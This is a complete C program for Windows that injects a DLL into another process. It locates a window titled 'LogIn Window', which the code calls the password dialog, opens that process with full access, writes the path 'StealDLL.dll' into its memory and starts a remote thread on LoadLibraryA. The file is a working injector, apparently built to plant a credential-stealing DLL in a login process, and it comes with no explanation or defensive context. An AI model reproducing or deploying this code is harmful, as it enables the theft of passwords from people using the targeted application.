#include <stdio.h>
#include <Windows.h>

int main()
{
	HWND hDialog = FindWindow(NULL, "LogIn Window");
	if (!hDialog)
	{
		printf("Failed to locate the password dialog.\n");
		return 1;
	}
	DWORD PID = 0;
	if (!GetWindowThreadProcessId(hDialog, &PID))
	{
		printf("Failed to locate the password process.\n");
		return 1;
	}
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess)
	{
		printf("Failed to open the password process.\n");
		return 1;
	}
	char cStealDLLFileName[] = "StealDLL.dll";
	DWORD dwStealDLLFileNameLen = sizeof(cStealDLLFileName);
	void * lpDataAddr = VirtualAllocEx(hProcess, NULL, dwStealDLLFileNameLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!lpDataAddr)
	{
		printf("Failed to allocate memory.\n");
		CloseHandle(hProcess);
		return 1;
	}
	SIZE_T szBytesWritten;
	if (!WriteProcessMemory(hProcess, lpDataAddr, cStealDLLFileName, dwStealDLLFileNameLen, &szBytesWritten))
	{
		printf("Failed to write memory.\n");
		CloseHandle(hProcess);
		return 1;
	}
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)(&LoadLibraryA), lpDataAddr, NULL, NULL);
	if (!hThread)
	{
		printf("Failed to create a remote thread.\n");
		CloseHandle(hProcess);
		return 1;
	}
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("Finished.\n");
	return 0;
}